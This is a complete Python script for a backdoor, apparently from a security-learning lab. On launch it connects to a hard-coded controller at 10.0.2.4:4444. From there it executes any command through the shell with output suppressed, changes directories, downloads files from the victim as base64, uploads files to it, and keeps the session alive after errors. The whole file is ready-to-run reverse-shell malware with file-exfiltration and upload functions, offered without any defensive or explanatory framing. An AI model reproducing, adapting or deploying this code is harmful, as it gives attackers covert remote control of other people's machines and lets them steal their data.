
import socket
import subprocess
import json
import os
import base64
import sys


class Backdoor:
    def __init__(self, host, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((host, port))

    def reliable_send(self, data):
        """Send JSON-encoded data reliably."""
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    def reliable_receive(self):
        """Receive and decode JSON data reliably."""
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue  # Wait until full JSON data is received

    def execute_system_command(self, command):
        """Execute system commands and suppress console output."""
        DEVNULL = open(os.devnull, 'wb')
        try:
            return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode()
        except subprocess.CalledProcessError:
            return "[-] Command execution failed."

    def change_working_directory_to(self, path):
        """Change the working directory."""
        try:
            os.chdir(path)
            return f"[+] Changed directory to {path}"
        except FileNotFoundError:
            return f"[-] Directory '{path}' not found."

    def read_file(self, path):
        """Read a file's content in binary mode and encode it to Base64."""
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except Exception as e:
            return f"[-] Error reading file: {e}"

    def write_file(self, path, content):
        """Write the received content to a file."""
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
            return f"[+] File '{path}' uploaded successfully."
        except Exception as e:
            return f"[-] Error saving file: {e}"

    def run(self):
        """Main loop to handle commands and maintain the connection."""
        while True:
            try:
                command = self.reliable_receive()

                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()

                elif command[0] == "cd" and len(command) > 1:
                    result = self.change_working_directory_to(command[1])

                elif command[0] == "download" and len(command) > 1:
                    result = self.read_file(command[1])

                elif command[0] == "upload" and len(command) > 2:
                    result = self.write_file(command[1], command[2])

                else:
                    result = self.execute_system_command(command)

                self.reliable_send(result)

            except Exception as e:
                self.reliable_send(f"[-] Error: {e}")
                continue  # Keep the connection alive


my_backdoor = Backdoor("10.0.2.4", 4444)
my_backdoor.run()
